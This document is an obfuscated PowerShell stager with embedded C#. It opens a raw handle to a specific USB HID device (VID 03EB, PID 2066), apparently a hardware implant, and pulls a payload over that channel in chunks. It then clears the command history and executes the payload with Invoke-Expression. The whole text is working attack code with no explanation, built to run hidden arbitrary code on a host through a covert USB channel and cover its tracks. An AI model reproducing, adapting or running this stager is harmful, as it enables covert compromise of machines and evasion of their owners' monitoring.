$M=64;$cs='using System;using System.IO;using Microsoft.Win32.SafeHandles;using System.Runtime.InteropServices;namespace n{public class w{[DllImport("kernel32.dll",CharSet=CharSet.Auto,SetLastError=true)] public static extern SafeFileHandle CreateFile(String fn,UInt32 da,Int32 sm,IntPtr sa,Int32 cd,uint fa,IntPtr tf);public static FileStream o(string fn){return new FileStream(CreateFile(fn,0XC0000000U,3,IntPtr.Zero,3,0x40000000,IntPtr.Zero),FileAccess.ReadWrite,9,true);}}}'
Add-T	 -T	 $cs;function stage(){$devs=gw	 Win32_USBControllerDevice;fore	($dev in $devs){$wmidev=[wmi]$dev.Dependent;if($wmidev.GetPropertyValue('DeviceID')-match('03EB&PID_2066')-and($wmidev.GetPropertyValue('Service')-eq$null)){$fn=('\\?\'+$wmidev.GetPropertyValue('DeviceID').ToString().Replace('\','#')+'#{4d1e55b2-f16f-11cf-88cb-001111000030}')}}try{$f=[n.w]::o($fn);$e=$g=0;$s=New-Object IO.MemoryStream;do{$b=New-Object Byte[]($M+1);$b[2]=2;$f.Write($b,0,$M+1);$r=$f.Read($b,0,$M+1);if($b[1]-ge2){$o=0;if($e-eq0){$e=($b[2]*256)+$b[3];$o=2;}$s.Write($b,$o+2,$b[1]-$o);$g+=$b[1]-$o;[System.Console]::Write($b,$o+2,$b[1]-$o);}}while($g-lt$e-or$e-eq0);clhy;IEx ([Text.Encoding]::ASCII).GetString($s.ToArray())}catch{echo $_.Exception|Format-L	 -F	}}stage
